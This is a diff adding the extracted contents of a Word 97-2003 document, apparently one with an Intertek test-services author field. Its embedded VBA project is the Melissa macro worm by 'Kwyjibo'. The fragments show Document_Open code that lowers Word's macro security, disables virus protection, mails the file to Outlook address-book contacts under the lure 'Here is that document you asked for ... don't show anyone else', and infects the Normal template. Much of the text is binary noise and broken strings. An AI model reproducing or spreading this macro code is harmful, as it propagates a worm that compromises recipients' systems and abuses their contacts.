@@ -1,0 +1,551 @@
+bjbj~
+)Yey
+)Y%m
+b/g
+RlQ
+TPg(
+,glQ
+)Yey
+)Y%m
+b/g
+RlQ
+YXb
+hKm
+01u
+N7h
+TGW:N
+TPg(
+v7h
+Vdk
+R7h
+0@b
+Oo`
+YXb
+v7h
+Oo`
+7hFO
+YXbKm
+v7h
+TPg(
+vQ7h
+Oo`
+,glQ
+[JT
+Oo`
+[hQ^\
+N&{
+GW1u,glQ
+b@b
+vhQ
+esQ
+yrdk
+{naP
+=2{2{
+RH_
+RH_
+CJ%
+aJ%
+CJ,
+aJ,
+CJ,
+aJ,
+CJ!
+aJ!
+h.bH
+CJ'
+aJ'
+h.bH
+CJ'
+aJ'
+h.bH
+vlQ
+,{ 
+ 1 
+qQ 
+ 1 
+Normal
+Default Paragraph Font
+Table Normal
+No List
+Body Text
+Body Text Char
+List Paragraph
+Table Paragraph
+[Content_Types].xml
+B+$
+pgL
+5v&
+?6N
+^e5
+|6^
+_rels/.rels
+%v/
+[xp
+4b$
+theme/theme/themeManager.xml
+(Eb
+sQ}#
+$j=
+theme/theme/theme1.xml
+?4}
+nuWI
+8B=?
+ruT
+S>U
+Y1i
+2|k
+A1%
+v#W^
+RS,Y*
+^0>
+R$I
+z'$
+V(e
+7 o
+xkiN
+$Xx
+_Ob
+#bJ
+m;>
+84>
+!J-/
+#|a#ao 
+?A2v
+kR*
+c:?7
+03D
+4GV
+O3B
+sf1
+;qq
+Vp8T
+3#=
+vy|W
+l#}
+:Xt
+q]_wK
+hjf
+,+.
+N:Y6H
+Vo@B
+[-~s
+dkp
+4^\zgt
+WaE"+
+Q^Q
+u*/
+iQ52
+`P+'
+;v+j
+6;{
+AC4
+WPXd
+d{Esg
+UM\
+V}8
+>r[
+theme/theme/_rels/themeManager.xml.rels
+6?$Q
+K(M&$R(.1
+QAs
+[Content_Types].xmlPK
+_rels/.relsPK
+theme/theme/themeManager.xmlPK
+theme/theme/theme1.xmlPK
+theme/theme/_rels/themeManager.xml.relsPK
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<a:clrMap xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>
+.bH
+Unknown
+Times New Roman
+Symbol
+Arial
+Calibri
+[SO
+SimSun
+ Light
+DengXian
+Cambria Math
+b/g
+RlQ
+licole_luo
+Andrea Zhu Intertek
+licole_luo
+Normal
+Andrea Zhu Intertek
+Microsoft Office Word
+Intertek Testing Services HK Ltd
+Title
+Root Entry
+ghv
+1Table
+WordDocument
+SummaryInformation
+DocumentSummaryInformation
+Macros
+VBA
+XJv
+Melissa
+,To
+,E1N+Optio
+7firm@90vers
+ - 1): E
+ Virus
+ate
+Save
+mpt
+*nd
+ If
+Dim
+ UngaDas
+Outlook,B 
+MapiA
+,D B
+kUm
+Set
+eObj
+.App
+0.Get
+{AP
+Md{?
+H by Kwy
+jibo
+.Logo0n "p
+paXssw
+1 To
+.Address
+List
+@un
+(y ,e
+/c82I
+|(0h
+oo/
+E`qie
+Peep
+(xh
+.RePcipi
+x + 
+6x > 5
+mportant
+7age F
+rom " & 
+H_.User
+Bod!C"Her
+e is tha
+t d
+ you
+ ask
+f@H
+don't sh
+ow anyon
+e e
+ ;-)
+achA
+ul"
+end
+DI1A){
+VB RQQ
+.VB
+01p*
+NTC
+.code
+module@^0>
+OfLines
+ADB
+BGN
+del
+et`
+ 1, 
+]ToInf@\t =@
+oAD0
+NzT
+ Go
+pYCYA2
+Dov
+Do Wh`
+Loo
+J1D
+ ("
+|()
+@#,Op
+(In
+|iv_
+ 1(
+0':B'
+B0)
+*AsA
+(In
+P!Q&L[!0
+E\ 
+=t F!
+s F
+' WORD/TL w
+ten
+ks iP
+ 2000%
+97S
+de!
+d -> Em ail |
+fit's 
+a ne
+Day(NowA@
+MinP
+@gon.Type&Tp
+two poi g , plu
+ple-
+-sc
+oret
+fift
+usin
+g all my
+  ]t 
+.  G
+I'm
+ outta h
+Sub
+__SRP_2
+__SRP_3
+_VBA_PROJECT
+dir
+rU@
+Macro
+Tools
+rU@
+Outlook.Appl
+*\G{000204EF-0000-0000-C000-000000000046}#4.2#9#C:\Program Files\Common Files\Microsoft Shared\VBA\VBA7.1\VBE7.DLL#Visual Basic For Applications
+*\G{00020905-0000-0000-C000-000000000046}#8.7#0#C:\Program Files\Microsoft Office\Root\
+1Normal.Melissa
+$*\Rffff*036300ff85
+HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security
+Level
+Security...
+Macro
+HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security
+Level
+Macro
+Tools
+Outlook.Application
+MAPI 
+HKEY_CURRENT_USER\Software\Microsoft\Office\
+Melissa? 
+... by Kwyjibo
+Outlook
+profile
+password 
+B@N
+B@d
+Important Message From 
+Here is that document you asked for ... don't show anyone else ;-) 
+B@d
+B@t
+B@v
+... by Kwyjibo
+HKEY_CURRENT_USER\Software\Microsoft\Office\
+Melissa? 
+Melissa
+Melissa
+Melissa
+Melissa
+Private Sub Document_Close()
+Private Sub Document_Open()
+Document
+Document
+WORD/Melissa written by Kwyjibo
+Works in both Word 2000 and Word 97
+Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide!
+Word -> Email | Word 97 <--> Word 2000 ... it's a new age! 
+ Twenty-two points, plus triple-word-score, plus fifty points for using all my letters.  Game's over.  I'm outta here. 
+Attribut
+e VB_Nam
+e = "Mel
+issa"
+Bas
+x1Nor
+mal.
+Glo
+bal
+SpacA
+bFalse
+reatabl
+Predecla
+Tru
+B@Expose
+emplateD
+eriv
+$Cus`tomiz
+ Sub D
+ocument_
+Open()
+On Error
+ Res
+ Ne
+If S@ystem.
+rofileS
+ng("", "
+HKEY_CUR
+RENT_USE
+R\Softw
+\Micros
+\Office\
+9.0\Word
+\Securit
+ Level"
+) <> "" 
+Then
+mmandBar s("Ma
+#")
+.Control#
+...
+Y= 1&
+Office16\MSWORD.OLB#Microsoft Word 16.0 Object Library
+*\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\Windows\System32\stdole2.tlb#OLE Automation
+*\CNormal
+*\CNormal
+*\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.8#0#C:\Program Files\Common Files\Microsoft Shared\OFFICE16\MSO.DLL#Microsoft Office 16.0 Object Library
+Melissa
+036300ff85
+Melissa
+Word
+VBA
+Win16
+Win32
+Win64x
+Mac
+VBA6
+VBA7
+Project1
+stdole
+Project-
+ThisDocument<
+_Evaluate
+Normal
+Office
+Documentj
+MelissaQ
+Document_Open
+Systema
+PrivateProfileString[
+CommandBars
+Controls
+Enabled
+Options
+ConfirmConversions
+VirusProtectionoD`
+SaveNormalPrompt
+UngaDasOutlookH
+DasMapiNameg
+BreakUmOffASlice
+CreateObject
+GetNameSpaceC
+Logon
+AddressLists
+Count0v`
+AddyBook@
+CreateItem
+AddressEntries
+Peeps
+Recipients
+Add
+SubjectRP`
+Application
+UserName\
+Bodyl
+Attachments_
+ActiveDocument
+FullName
+Send
+LogoffQ8`
+ADI1
+VBProjectOh`
+VBComponents
+Item
+NTI1
+NormalTemplateq
+NTCL
+codemodule
+CountOfLines!\`
+ADCL
+BGN
+deletelines
+ToInfect
+DoAD(
+DoNT
+CYA
+Lines
+AddFromString
+InsertLines
+SaveAsf;`
+FileNamej
+Savedd
+Day
+Now%
+Minuteam`
+SelectionZ
+TypeText
+Project
+rstd
+ole>
+dol
+\G{00020
+430-
+0046}#
+2.0#0#C:
+\Windows
+\System3
+e2.tlb
+#OLE Aut
+omation
+ENormal
+!Offic
+!G{2
+DF8D04C-
+5BFA-101@B-BDE5
+gAjA
+ram File
+s\Common
+Microso
+ft Share
+d\OFFICE
+16\MSO.D
+LL#
+M 16 .0 Ob
+ibrary
+|MelissPaG
+__SRP_0
+__SRP_1
+PROJECTwm
+PROJECT
+*\CNormalrU
+c_P
+Project1
+Project
+ThisDocument
+C:\Program Files\Common Files\Microsoft Shared\VBA\VBA7.1\VBE7.DLL
+VBA
+C:\Program Files\Microsoft Office\Root\Office16\MSWORD.OLB
+Word
+C:\Windows\System32\stdole2.tlb
+stdole
+C:\Program Files\Common Files\Microsoft Shared\OFFICE16\MSO.DLL
+Office
+Melissa
+Document
+rU@
+Melissa
+Melissa
+ID="{2F1A158F-EE72-48ED-8B3A-3416CB9ACDF3}"
+Document=Melissa/&H00000000
+Name="Project"
+HelpContextID="0"
+VersionCompatible32="393222000"
+CMG="B8BAA5D3A9D3A9D3A9D3A9"
+DPB="696B748975897589"
+GC="1A180784B985B98546"
+[Host Extender Info]
+&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000
+[Workspace]
+Melissa=0, 0, 0, 0, C
+Microsoft Word 97-2003 Document
+MSWordDoc
+Word.Document.8
+CompObj
